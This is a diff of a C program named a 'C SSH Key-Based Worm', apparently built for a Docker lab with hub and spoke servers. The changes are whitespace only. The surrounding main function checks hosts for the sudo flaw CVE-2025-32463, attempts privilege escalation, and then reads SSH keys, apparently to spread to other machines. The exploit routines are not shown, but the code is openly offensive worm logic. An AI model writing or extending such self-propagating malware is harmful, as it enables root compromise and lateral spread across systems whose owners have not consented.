@@ -540,7 +540,6 @@ void get_net_24(const char *ip, char *out) {
     }
 }
 
-
 int main(int argc, char* argv[]) {
     (void)argc;  // Suppress unused parameter warning
     printf("=== C SSH Key-Based Worm ===\n");
@@ -554,6 +553,7 @@ int main(int argc, char* argv[]) {
     // Attempt privilege escalation on spoke servers (before SSH key check)
     // Spoke servers have vulnerable sudo installed, so we can detect them by checking for the vulnerability
     // This works better than hostname checking since Docker containers have random hostnames
+
     printf("\n[*] Checking for CVE-2025-32463 (Sudo NSS Injection)...\n");
     if (cve_2025_32463_scan()) {
         printf("[+] CVE-2025-32463 vulnerability detected! This appears to be a spoke server.\n");
@@ -567,7 +567,7 @@ int main(int argc, char* argv[]) {
         printf("[-] CVE-2025-32463 not applicable (sudo version not vulnerable or not installed)\n");
         printf("[*] This appears to be the hub server, skipping privilege escalation\n");
     }
-    
+
     // Check if SSH keys exist
     int keys_found = read_ssh_key();
     if (keys_found == 0) {
@@ -634,4 +634,3 @@ int main(int argc, char* argv[]) {
     }
     return 0;
 }
-
